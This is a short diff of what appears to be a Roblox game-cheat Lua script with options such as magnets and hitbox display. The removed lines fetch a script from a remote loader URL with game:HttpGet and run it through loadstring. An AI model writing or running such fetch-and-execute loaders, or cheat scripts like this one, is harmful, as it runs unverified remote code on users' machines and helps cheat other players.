@@ -15,14 +15,6 @@
 
 ]]--
 
--- Load the external script using loadstring
-local externalScript = loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a1ed35790d66908639d8042ccc5d7311.lua"))
-
-externalScript()
-
-wait(3)
-
-
 -- // Settings controlled by UI
 local Magnets = false
 local ShowHitbox = false
